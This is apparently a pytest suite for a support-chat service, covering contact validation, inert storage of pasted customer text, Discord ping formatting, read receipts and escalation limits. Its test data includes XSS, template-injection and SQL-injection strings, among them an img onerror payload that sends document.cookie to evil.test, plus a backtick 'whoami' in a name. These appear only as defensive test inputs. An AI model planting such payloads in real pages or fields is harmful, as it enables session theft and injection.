"""Contact validation, inert customer text, typing, read receipts, escalation and the "your customer
replied" ping. The first part needs no database; the rest runs against the real one."""
from __future__ import annotations

import json
import uuid
from datetime import datetime, timedelta, timezone

import pytest

from app import workers
from app.config import Settings
from app.discord import allowed_mentions_for, escalation_payload, reply_payload, ticket_payload, valid_mention
from app.validation import InvalidInput, clean_name, clean_text, normalize_email, normalize_phone

from .conftest import claim, drain, needs_db, owner_exec, recv_until, verify

# --- 1. email or phone, for any country --------------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    ["+1 415 555 2671", "+44 7911 123456", "+61 412 345 678", "+81 90-1234-5678", "+55 11 91234-5678", "+971 50 123 4567", "+234 803 123 4567", "+86 138 0013 8000"],
)
def test_mobile_numbers_from_around_the_world_are_accepted(raw):
    assert normalize_phone(raw).startswith("+")


@pytest.mark.parametrize(
    ("raw", "says"),
    [
        ("+999 1234 5678", "country code does not exist"),
        ("+91 98765", "too few digits for +91"),
        ("+44 7911 123456 7890", "too many digits"),
        ("+1 212 055 1234", "not a valid +1"),  # the right length, but no US exchange starts with 0
        ("+1 (415) 555-26a1", "digits only"),
        ("+12", "digits only"),
    ],
)
def test_bad_numbers_say_what_is_wrong(raw, says):
    with pytest.raises(InvalidInput) as e:
        normalize_phone(raw)
    assert says in str(e.value)


@pytest.mark.parametrize("bad", [".asha@example.com", "asha.@example.com", "asha@example", "asha@exa_mple.com", "asha@@example.com"])
def test_emails_with_misplaced_dots_or_bad_domains_are_refused(bad):
    with pytest.raises(InvalidInput):
        normalize_email(bad)


# --- 2. pasted code is text, never markup ------------------------------------------------------

PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    '<img src=x onerror="fetch(`//evil.test/`+document.cookie)">',
    "javascript:alert(1)",
    "{{constructor.constructor('alert(1)')()}}",
    "'; DROP TABLE support_messages; --",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_messages_keep_pasted_code_exactly_as_typed(payload):
    # Stored verbatim (a customer may paste a real error or a config file) and rendered as text.
    assert clean_text(payload, max_len=4000) == payload


@pytest.mark.parametrize("name", ["<script>alert(1)</script>", "Asha <b>Verma</b>", "{{7*7}}", "Asha`whoami`", "a\\u0041"])
def test_names_cannot_carry_markup(name):
    with pytest.raises(InvalidInput):
        clean_name(name, max_len=120)


@pytest.mark.parametrize("name", ["Asha Verma", "Seán O'Brien", "José-María Núñez", "李小龍", "Dr. A. K. Singh, Jr."])
def test_real_names_from_anywhere_are_fine(name):
    assert clean_name(name, max_len=120) == name


def test_invisible_characters_are_removed():
    assert clean_text("pay​pal﻿ ⁠now", max_len=50) == "paypal now"
    assert clean_text("\U0001F469‍\U0001F4BB", max_len=50) == "\U0001F469‍\U0001F4BB"  # emoji sequences keep their joiner


# --- 5 and 6. Discord posts ---------------------------------------------------------------------

PORTAL = "https://rackloom.in/support/agent/ticket/RCK-7K3M9QX2"
ADMIN = "https://rackloom.in/admin/support"
NOW = datetime.now(timezone.utc)


def claimed_ticket(**over) -> dict:
    t = {
        "reference": "RCK-7K3M9QX2", "effective_status": "CLAIMED", "customer_name": "Asha Verma", "customer_email": "asha@example.com",
        "customer_phone": None, "agent_name": "Priya Sharma", "created_at": NOW - timedelta(days=3), "claimed_at": NOW - timedelta(days=3),
        "access_expires_at": NOW + timedelta(days=4), "query": "My H100 will not start.", "escalation_count": 0, "last_escalated_at": None,
    }
    t.update(over)
    return t


def fields(payload: dict) -> dict:
    return {f["name"]: f["value"] for f in payload["embeds"][0]["fields"]}


def test_the_reply_ping_names_the_agent_and_links_back_to_the_chat():
    p = reply_payload(claimed_ticket(), {"unread": 2, "latest": "Any update? <@&1> @everyone", "latest_at": NOW}, PORTAL)
    assert p["content"] == "**Priya Sharma**, your customer on ticket **RCK-7K3M9QX2** has replied and is waiting for you."
    assert p["allowed_mentions"] == {"parse": []}
    f = fields(p)
    assert f["Unread"] == "2 messages" and f["Handled by"] == "Priya Sharma" and f["Action"] == f"[Resume the conversation]({PORTAL})"
    assert "\\<@&1\\>" in p["embeds"][0]["description"]  # the customer's text cannot ping a role
    assert "#k=" not in json.dumps(p)


def test_an_escalation_asks_for_top_priority_and_pings_only_who_is_configured():
    t = claimed_ticket(escalation_count=2)
    p = escalation_payload(t, {"count": 2, "note": "Still broken **after** 3 days [click](http://evil.test)"}, PORTAL, ADMIN, "<@&123456789012>")
    e = p["embeds"][0]
    assert p["content"].startswith("<@&123456789012> ") and "RCK-7K3M9QX2" in p["content"] and "highest priority" in p["content"]
    assert p["allowed_mentions"] == {"parse": [], "roles": ["123456789012"]}
    assert "handled by **Priya Sharma**" in e["description"] and "highest priority" in e["description"]
    assert "Still broken \\*\\*after\\*\\* 3 days \\[click\\]\\(http" in e["description"]
    assert fields(p)["Escalation"] == "#2 (escalated before)" and ADMIN in fields(p)["Action"]
    # No mention configured: posted, nobody pinged.
    quiet = escalation_payload(t, {"count": 1}, PORTAL, ADMIN, "")
    assert quiet["allowed_mentions"] == {"parse": []} and not quiet["content"].startswith("<")
    # The ticket's own post shows that it was escalated.
    assert "Escalated" in fields(ticket_payload(claimed_ticket(escalation_count=1, last_escalated_at=NOW), PORTAL))


def test_escalation_mentions_are_checked():
    for ok in ["@here", "@everyone", "<@&123456789012>", "<@123456789012>", "<@!123456789012>"]:
        assert valid_mention(ok), ok
    for bad in ["here", "<#123456789012>", "@here hi", "<@&abc>", "<@&1>"]:
        assert not valid_mention(bad), bad
    assert allowed_mentions_for("@here") == {"parse": ["everyone"]}
    assert allowed_mentions_for("<@123456789012>") == {"parse": [], "users": ["123456789012"]}
    assert any("ESCALATION_MENTION" in p for p in Settings(database_url="postgresql://x", public_url="http://localhost:3000", discord_escalation_mention="everyone!").startup_problems())


# --- with the database --------------------------------------------------------------------------


@pytest.fixture()
def claimed(client, browser, new_ticket, new_agent):
    created = new_ticket()
    ref = created["ticket"]["reference"]
    agent = new_agent("Priya Sharma")
    ab = browser()
    assert verify(ab, ref, agent["normalized_phone_number"]).status_code == 200
    assert claim(ab, ref).status_code == 200
    return {"ref": ref, "agent": agent, "agent_browser": ab}


def cws(b, ref, after=0):
    return b.websocket_connect(f"/api/support/tickets/{ref}/ws?after={after}")


def aws(b, ref, after=0):
    return b.websocket_connect(f"/api/support/agent/tickets/{ref}/ws?after={after}")


def say(ws, body):
    ws.send_json({"type": "message", "client_id": str(uuid.uuid4()), "body": body})
    return recv_until(ws, "ack")[0]["message"]


def ticket_row(ref: str, cols: str):
    return owner_exec(f"select {cols} from support_tickets where public_ticket_reference = %s", (ref,))[0]


@needs_db
def test_a_customer_cannot_name_themselves_with_markup(client):
    from .conftest import ticket_body

    res = client.post("/api/support/tickets", json=ticket_body(name="<img src=x onerror=alert(1)>"))
    assert res.status_code == 422 and "name" in res.json()["fields"]


@needs_db
def test_the_api_returns_bad_contact_details_with_reasons(client):
    from .conftest import ticket_body

    res = client.post("/api/support/tickets", json=ticket_body(email=None, phone="+91 98765"))
    assert res.status_code == 422 and "too few digits" in res.json()["fields"]["phone"]


@needs_db
def test_pasted_code_reaches_the_other_side_as_the_same_text(client, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    with cws(client, ref) as c, aws(ab, ref) as a:
        recv_until(c, "ready")
        recv_until(a, "ready")
        sent = say(c, PAYLOADS[1])
        got, _ = recv_until(a, "message")
        while got["message"]["seq"] != sent["seq"]:
            got, _ = recv_until(a, "message")
        assert got["message"]["body"] == PAYLOADS[1]  # JSON text; the page renders it as text, never as HTML


@needs_db
def test_typing_reaches_only_the_other_side(client, browser, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    with cws(client, ref) as c, aws(ab, ref) as a:
        recv_until(c, "ready")
        recv_until(a, "ready")
        c.send_json({"type": "typing", "typing": True})
        ev, _ = recv_until(a, "typing")
        assert ev == {"type": "typing", "sender": "customer", "typing": True}
        a.send_json({"type": "typing", "typing": False})
        ev, _ = recv_until(c, "typing")
        assert ev == {"type": "typing", "sender": "agent", "typing": False}
        # The customer does not hear their own typing back; a ping proves nothing else was queued for them.
        c.send_json({"type": "ping"})
        _, before = recv_until(c, "pong")
        assert not [e for e in before if e["type"] == "typing"]
    # Nothing about typing is stored: the conversation still holds the query and the "joined" line.
    assert owner_exec("select count(*) from support_messages m join support_tickets t on t.id = m.ticket_id where t.public_ticket_reference = %s", (ref,))[0][0] == 2


@needs_db
def test_receipts_turn_the_senders_ticks_grey_then_blue(client, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    with cws(client, ref) as c, aws(ab, ref) as a:
        ready, _ = recv_until(c, "ready")
        assert ready["ticket"]["receipts"] == {"delivered": 0, "read": 0}
        recv_until(a, "ready")
        m = say(c, "Is anyone there?")
        got, _ = recv_until(a, "message")
        while got["message"]["seq"] != m["seq"]:
            got, _ = recv_until(a, "message")
        # The agent's browser has it, but the tab is in the background: two grey ticks.
        a.send_json({"type": "receipt", "delivered": m["seq"]})
        ev, _ = recv_until(c, "receipts")
        assert ev["receipts"] == {"delivered": m["seq"], "read": 0}
        # The agent looks at it: blue.
        a.send_json({"type": "receipt", "delivered": m["seq"], "read": m["seq"]})
        ev, _ = recv_until(c, "receipts")
        assert ev["receipts"] == {"delivered": m["seq"], "read": m["seq"]}
        # A client cannot vouch for messages it was never sent, nor move a cursor back.
        a.send_json({"type": "receipt", "delivered": m["seq"] + 1000, "read": m["seq"] + 1000})
        a.send_json({"type": "receipt", "delivered": 1, "read": 1})
        a.send_json({"type": "receipt", "delivered": "x", "read": True})
        a.send_json({"type": "ping"})
        recv_until(a, "pong")
    assert ticket_row(ref, "agent_delivered_seq, agent_read_seq") == (m["seq"], m["seq"])
    # A fresh page load gets the same state.
    assert client.get(f"/api/support/tickets/{ref}").json()["ticket"]["receipts"] == {"delivered": m["seq"], "read": m["seq"]}
    agent_view = ab.get(f"/api/support/agent/tickets/{ref}").json()["ticket"]
    assert agent_view["receipts"] == {"delivered": 0, "read": 0}  # the customer never reported reading


@needs_db
def test_escalation_once_a_day_with_a_discord_post_and_a_line_in_the_chat(client, browser, fakes, claimed, new_ticket):
    ref = claimed["ref"]
    drain(client)
    before = len(fakes["discord"].posts)
    t = client.get(f"/api/support/tickets/{ref}").json()["ticket"]
    assert t["escalation"] == {"count": 0, "last_at": None, "next_at": None, "can_escalate": True}
    with cws(client, ref) as c:
        recv_until(c, "ready")
        res = client.post(f"/api/support/tickets/{ref}/escalate", json={"note": "Three days and <b>still</b> down"})
        assert res.status_code == 200, res.text
        esc = res.json()["ticket"]["escalation"]
        assert esc["count"] == 1 and esc["can_escalate"] is False and esc["next_at"]
        line, _ = recv_until(c, "message")
        while "escalated" not in line["message"]["body"]:
            line, _ = recv_until(c, "message")
        assert line["message"]["sender"] == "system"
        assert "escalated" in line["message"]["body"] and "<b>still</b>" in line["message"]["body"]
    # A second try within 24 hours is refused, with when it is allowed again.
    again = client.post(f"/api/support/tickets/{ref}/escalate", json={})
    assert again.status_code == 429 and again.json()["error"] == "escalation_cooldown" and again.json()["next_at"]
    assert ticket_row(ref, "escalation_count") == (1,)
    drain(client)
    posts = fakes["discord"].posts[before:]
    esc_post = next(p for p in posts if "Escalated ticket" in p["content"])
    assert ref in esc_post["content"] and "Priya Sharma" in esc_post["embeds"][0]["description"]
    assert "\\<b\\>still\\</b\\>" in esc_post["embeds"][0]["description"]
    assert owner_exec("select count(*) from support_ticket_events e join support_tickets t on t.id = e.ticket_id where t.public_ticket_reference = %s and e.action = 'ESCALATED'", (ref,))[0][0] == 1
    # A day later it may be escalated again.
    owner_exec("update support_tickets set last_escalated_at = now() - interval '25 hours' where public_ticket_reference = %s", (ref,))
    assert client.post(f"/api/support/tickets/{ref}/escalate", json={}).status_code == 200
    assert ticket_row(ref, "escalation_count") == (2,)
    # Not before an agent has the ticket, and never for someone else's ticket.
    waiting = new_ticket()["ticket"]["reference"]
    assert client.post(f"/api/support/tickets/{waiting}/escalate", json={}).json()["error"] == "not_claimed"
    assert browser().post(f"/api/support/tickets/{ref}/escalate", json={}).status_code == 401


@needs_db
def test_an_ended_ticket_cannot_be_escalated(client, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    assert ab.post(f"/api/support/agent/tickets/{ref}/resolve", json={}).status_code == 200
    res = client.post(f"/api/support/tickets/{ref}/escalate", json={})
    assert res.status_code == 410 and res.json()["error"] == "ticket_closed"


def due_now(ref: str) -> None:
    owner_exec(
        "update support_notifications n set next_attempt_at = now() from support_tickets t where t.id = n.ticket_id and t.public_ticket_reference = %s and n.status = 'pending'",
        (ref,),
    )


def reply_rows(ref: str) -> list:
    return owner_exec(
        "select n.status, n.last_error from support_notifications n join support_tickets t on t.id = n.ticket_id "
        "where t.public_ticket_reference = %s and n.kind = 'discord_customer_reply' order by n.created_at",
        (ref,),
    )


@needs_db
def test_the_agent_hears_in_discord_when_their_customer_writes_while_they_are_away(client, fakes, claimed):
    ref = claimed["ref"]
    drain(client)
    before = len(fakes["discord"].posts)
    with cws(client, ref) as c:  # days later: the agent's page is closed
        recv_until(c, "ready")
        say(c, "Hello? It broke again.")
        say(c, "Any update?")
    # One ping waits, however many messages; it is not due straight away (the agent may be about to look).
    assert reply_rows(ref) == [("pending", None)]
    drain(client)
    assert not [p for p in fakes["discord"].posts[before:] if ref in p["content"] and "has replied" in p["content"]]
    due_now(ref)
    drain(client)
    ping = next(p for p in fakes["discord"].posts[before:] if ref in p["content"] and "has replied" in p["content"])
    assert ping["content"].startswith("**Priya Sharma**, your customer on ticket **" + ref)
    assert fields(ping)["Unread"] == "2 messages" and "Any update?" in ping["embeds"][0]["description"]
    assert ping["embeds"][0]["url"].endswith(f"/support/agent/ticket/{ref}")
    assert reply_rows(ref) == [("sent", None)]
    # More messages straight after: no second ping inside the cooldown.
    with cws(client, ref) as c:
        recv_until(c, "ready")
        say(c, "Still there?")
    assert reply_rows(ref) == [("sent", None)]


@needs_db
def test_no_ping_when_the_agent_reads_the_message_in_time(client, fakes, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    drain(client)
    before = len(fakes["discord"].posts)
    with cws(client, ref) as c, aws(ab, ref) as a:
        recv_until(c, "ready")
        recv_until(a, "ready")
        m = say(c, "Quick question")
        got, _ = recv_until(a, "message")
        while got["message"]["seq"] != m["seq"]:
            got, _ = recv_until(a, "message")
        a.send_json({"type": "receipt", "delivered": m["seq"], "read": m["seq"]})
        recv_until(c, "receipts")
    due_now(ref)
    drain(client)
    assert not [p for p in fakes["discord"].posts[before:] if ref in p["content"] and "has replied" in p["content"]]
    assert reply_rows(ref) == [("skipped", "the agent has read it")]


@needs_db
def test_agent_messages_never_queue_a_ping_and_a_reply_counts_as_read(client, sup, claimed):
    ref, ab = claimed["ref"], claimed["agent_browser"]
    with aws(ab, ref) as a:
        recv_until(a, "ready")
        say(a, "Working on it.")
    assert reply_rows(ref) == []
    tid = owner_exec("select id from support_tickets where public_ticket_reference = %s", (ref,))[0][0]
    with cws(client, ref) as c:
        recv_until(c, "ready")
        say(c, "Thanks, waiting.")
    assert sup.store.reply_ping_context(tid)["unread"] == 1
    with aws(ab, ref) as a:  # no receipt from this (older) page, but it answered
        recv_until(a, "ready")
        say(a, "Found it, fixing now.")
    assert sup.store.reply_ping_context(tid)["unread"] == 0


@needs_db
def test_the_admin_overview_shows_escalations(client, claimed):
    ref = claimed["ref"]
    assert client.post(f"/api/support/tickets/{ref}/escalate", json={}).status_code == 200
    overview = client.get("/internal/overview", headers={"X-Internal-Token": "internal-test-token"}).json()
    row = next(x for x in overview["tickets"] if x["reference"] == ref)
    assert row["escalation_count"] == 1 and row["last_escalated_at"]
    client.portal.call(workers.sweep_once, client.app.state.support)  # the sweep is untroubled by the new columns
